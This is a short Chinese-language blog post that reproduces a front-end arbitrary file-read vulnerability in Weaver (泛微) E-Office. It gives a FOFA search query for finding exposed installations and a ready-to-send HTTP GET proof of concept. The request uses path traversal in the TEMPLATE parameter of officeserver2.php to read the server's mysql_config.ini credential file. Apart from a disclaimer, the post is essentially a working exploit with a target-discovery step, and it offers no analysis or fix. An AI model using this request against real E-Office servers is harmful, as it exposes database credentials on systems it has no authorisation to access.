# 原创
：  漏洞复现--泛微E-Office前台文件读取漏洞

# 漏洞复现--泛微E-Office前台文件读取漏洞

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！**

## 一：漏洞描述

泛微E-Office是一款企业级的全流程办公自动化软件，它包括协同办公、文档管理、知识管理、工作流管理等多个模块，涵盖了企业日常工作中的各个环节。在该产品前台登录页存在文件读取漏洞。

### 二：网络空间测绘查询

fofa：<br/> app=“泛微-EOffice”<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5f85be3e509285795afde9ec008d71e1.jpeg"/>

### 三：漏洞复现

poc：

```
GET /iweboffice/officeserver2.php?OPTION=LOADTEMPLATE&amp;COMMAND=INSERTFILE&amp;TEMPLATE=../../bin/mysql_config.ini HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/21e088803f94f61691e6704a46458289.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/6ed1f26b404356636531ee3e62da41a5.jpeg"/>
